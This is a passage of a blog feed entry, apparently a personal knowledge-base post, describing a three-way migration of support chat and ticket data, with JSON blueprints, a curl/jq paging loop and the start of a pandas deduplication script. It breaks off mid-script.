<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="atom.xsl"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kbbgl.github.io/blog</id>
    <title>Kobbi's Knowledgebase Blog</title>
    <updated>2025-02-26T00:45:50.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://kbbgl.github.io/blog"/>
    <subtitle>Kobbi's Knowledgebase Blog</subtitle>
    <icon>https://kbbgl.github.io/img/favicon.svg</icon>
    <entry>
        <title type="html"><![CDATA[3-Way Data Migration between Support Systems]]></title>
        <id>https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems</id>
        <link href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>The company I work for decided a few months ago that we’ll be moving all customer tickets and assets from two separate systems (one for chat and one for old-school tickets) into a new, integrated system which provides both capabilites.
My task was to perform the migration between the systems.
Even though I’m not data engineer by any means, I accepted the challenge and thought it would teach me a lot about the planning and execution of such a complex project. It would also allow me to hone in my development/scripting skills and finally have some hands-on experience using a Python library I was always interested in working with, <a href="https://pandas.pydata.org/" target="_blank" rel="noopener noreferrer">pandas</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="planning-the-migration">Planning the Migration<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#planning-the-migration" class="hash-link" aria-label="Direct link to Planning the Migration" title="Direct link to Planning the Migration">​</a></h2>
<p>The first step was to understand what format the source and destination platforms supplied and expected the data in, respectively.
After reaching out to the destination platform engineers, they provided the following information:</p>
<ul>
<li>
<p>Supply a TAR archive with JSON files named <code>backup_tickets_{batch_number}.json</code>.</p>
</li>
<li>
<p>The JSON files need to have the following structure:</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"data"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"tickets"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"data"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"comments"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"users"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>Each JSON file should not include more than 100 objects within each nested array (<code>data</code>, <code>comments</code>, <code>users</code>, <code>organizations</code>).</p>
</li>
<li>
<p>The structure for each object had to be as follows:</p>
<ul>
<li>
<p><code>ticket</code> object blueprint:</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"created_at"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"2021-01-01T00:00:00Z"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"requester_id"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123456</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"id"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">654321</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p><code>comment</code> object blueprint:</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"created_at"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"2021-02-02T02:02:02Z"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"ticket_id"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">211243</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"id"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">789012</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"public"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"html_body"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"&lt;p&gt;dummy message&lt;/p&gt;"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"author_id"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123456</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li><code>user</code> object blueprint:</li>
</ul>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"name"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"John Doe"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"id"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">00076</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token property" style="color:#36acaa">"email"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"john.doe@somedomain.org"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
</li>
</ul>
<p>The source data came from two different places:</p>
<ul>
<li>
<p>The chat-related data was stored in a database that I did not have access to. Therefore, I received the data in CSV format with the following headers:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n1</span><span class="token plain"> chat_data.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TICKET_CREATED_AT,TICKET_REQUESTER_ID,COMMENT_PART_ID,CONVERSATION_ID,COMMENT_PUBLIC,BODY,COMMENT_CREATED_AT,AUTHOR_ID,NAME,EMAIL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>The ticket-related data was available through the provider REST API. This data was already imported into the destination system when I was assigned this task. So I needed to focus my efforts on migrating the chat-related data. I thought it would make the process easier but it actually complicated it a bit. More details on that in the section below.</p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-user-uniqueness-problem">The User Uniqueness Problem<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#the-user-uniqueness-problem" class="hash-link" aria-label="Direct link to The User Uniqueness Problem" title="Direct link to The User Uniqueness Problem">​</a></h2>
<p>One crucial detail that was not mentioned in the destination platform documentation was that the <strong>users imported need to be unique based on their email address</strong>.</p>
<p>This complicated things because:</p>
<ul>
<li>
<p>The users from the source ticketing platform already existed in the destination platform since they were previously imported.</p>
</li>
<li>
<p>There were users that existed on both source platforms but had different id attribute values.</p>
</li>
<li>
<p>The requirement from the destination platform system was to use the user id attribute that was already imported into the system.</p>
</li>
</ul>
<p>After some brainstorming, I was able to think about how to solve this discrepency. I broke up the problem into the following steps:</p>
<ol>
<li>Retrieve all users from the source ticketing platform.</li>
<li>Retrieve all users from the source chat platform.</li>
<li>Run a VLOOKUP to compare the id from both lists of users. If the email existed in both lists, take the id from the list of users generated in step 1. Otherwise, use the id from the list retrieved in step 2.</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-1-retrieving-users-from-source-ticketing-platform">Step 1: Retrieving Users from Source Ticketing Platform<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#step-1-retrieving-users-from-source-ticketing-platform" class="hash-link" aria-label="Direct link to Step 1: Retrieving Users from Source Ticketing Platform" title="Direct link to Step 1: Retrieving Users from Source Ticketing Platform">​</a></h2>
<p>Since I already knew the source ticketing platform could supply user data by accessing their REST API, I began by reading their documentation.</p>
<p>I found out that:</p>
<ul>
<li>
<p>The endpoint to retrieve user data was:
<code>GET /api/v1/users.json</code>.</p>
</li>
<li>
<p>The endpoint returned a maximum of 100 users in JSON format.</p>
</li>
<li>
<p>The endpoint offered a query parameter to specify paging through all users, i.e. <code>GET /api/v1/users.json?page=100</code>.</p>
</li>
<li>
<p>Basic authentication method was used to authenticate calls.</p>
</li>
<li>
<p>The JSON response included many user attributes. I was only interested in 2 of them: <code>id</code> and <code>email</code>.</p>
</li>
</ul>
<p>Reviewing the total amount of users in that platform, I found that there were a total of 56.7k. So I needed to run 567 calls (56700/100) to retrieve all the users. Sounds like a perfect solution for a combination of <code>curl</code>, <code>jq</code> within <code>bash</code> loops and redirection of output to appended file.
This is what I came up with:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">i</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..</span><span class="token number" style="color:#36acaa">567</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Retrieving users page </span><span class="token string variable" style="color:#36acaa">$i</span><span class="token string" style="color:#e3116c">..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> https://</span><span class="token variable" style="color:#36acaa">$SOURCE_URL</span><span class="token plain">.com/api/v1/users.json</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">?page</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$i</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> my_user/my_password </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> jq </span><span class="token string" style="color:#e3116c">'.users[] | [.id, .email] | @csv'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ticket_platform_users.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Finished retrieving users from page </span><span class="token string variable" style="color:#36acaa">$i</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This loop generated a CSV file with the following data:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n3</span><span class="token plain"> ticket_platform_users.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id,email</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">,user1@somedomain1.org</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2</span><span class="token plain">,user2@somedomain2.org</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Step 1 is done!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-2-generating-unique-users-list-from-source-chat-platform">Step 2: Generating Unique Users List from Source Chat Platform<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#step-2-generating-unique-users-list-from-source-chat-platform" class="hash-link" aria-label="Direct link to Step 2: Generating Unique Users List from Source Chat Platform" title="Direct link to Step 2: Generating Unique Users List from Source Chat Platform">​</a></h2>
<p>As previously mentioned, the data from the chat platform was sent to me in CSV format with the following headers:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n1</span><span class="token plain"> chat_data.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  TICKET_CREATED_AT,TICKET_REQUESTER_ID,COMMENT_PART_ID,CONVERSATION_ID,COMMENT_PUBLIC,BODY,COMMENT_CREATED_AT,AUTHOR_ID,NAME,EMAIL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The <code>chat_data.csv</code> file included all chat conversations which meant that every line in the CSV represented one message sent on the chatting platform. Since users (or <code>AUTHOR_ID</code> in this case) can write multiple messages in different <code>CONVERSATION_ID</code>s, I needed a way to take only the unique <code>AUTHOR_ID</code>s from this CSV. This is where I was introduced to the power of the Python <code>pandas</code> library.
I was able to generate a list of unique users using the following script:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">generate_unique_users.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">generate_unique_users.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Read only the relevant columns from the CSV file</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_csv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'chat_data.csv'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;usecols</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'NAME'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'EMAIL'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'AUTHOR_ID'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Rename the columns according to the `users` object blueprint</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users_rename </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rename</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"AUTHOR_ID"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"id"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"NAME"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"name"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"EMAIL"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"email"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Modify the column data type according to `users` object blueprint. `int64` is the `numpy.dtype` representing a number</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users_coltype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> users_rename</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">astype</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"id"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"int64"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" 